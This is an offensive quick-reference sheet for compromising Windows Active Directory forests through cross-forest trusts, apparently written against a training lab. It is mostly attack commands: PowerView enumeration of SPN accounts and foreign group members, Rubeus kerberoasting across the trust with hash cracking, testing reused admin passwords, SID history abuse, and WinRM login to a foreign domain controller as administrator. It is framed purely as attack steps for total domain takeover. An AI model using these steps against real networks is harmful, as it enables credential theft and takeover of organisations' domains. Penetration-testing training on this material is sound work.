# **Attacking Domain Trusts – Cross-Forest Trust Abuse (Windows Edition)**

*(Fast reference — all action, no fluff)*

---

# **1. Cross-Forest Kerberoasting (Windows)**

### **Enumerate SPN accounts in the OTHER forest**

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

If you see something like `mssqlsvc` → **Kerberoast it**.

---

# **2. Check Group Membership (Is SPN user privileged?)**

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select SamAccountName, MemberOf
```

If member of **Domain Admins / Enterprise Admins** → huge win.

---

# **3. Kerberoast Across the Trust with Rubeus**

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

→ Extract TGS hash → crack with Hashcat.

If cracked = **full control of foreign domain**.

---

# **4. Password Reuse Across Trusted Forests**

If you compromise Domain A admin creds, test reuse in Domain B:

* Built-in Administrator
* Domain Admins
* Enterprise Admins
* Similarly named accounts (adm_john.smith → johnsmith_admin)

This works **a LOT** in real environments.

---

# **5. Foreign Group Membership (Admins from Another Forest)**

Check if Domain A admins have privileges in Domain B:

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

Convert SID to user:

```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

If it resolves to:

```
INLANEFREIGHT\administrator
```

→ Instant admin across forest.

---

# **6. Validate Access (WinRM)**

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

If login works → **full Domain Admin on the other side**.

---

# **7. Cross-Forest SID History Abuse (High-Level)**

If SID Filtering is **disabled**, you can:

* Add admin SID from Forest A into account in Forest B
* Token includes those SIDs when crossing forest
* You become admin in the partner forest

Used during **user migrations** and **M&A** environments.

(Deep dive covered later.)

---

# ⭐ **Cross-Forest Attack Summary (60-second recap)**

1️⃣ Enumerate SPNs in other forest
2️⃣ Kerberoast → crack → remote Domain Admin
3️⃣ Check password reuse across forests
4️⃣ Check foreign group membership
5️⃣ Abuse SIDHistory if filtering disabled
6️⃣ WinRM or RDP into foreign DC as admin

**Result:** Full compromise of **multiple forests** via trust.

---
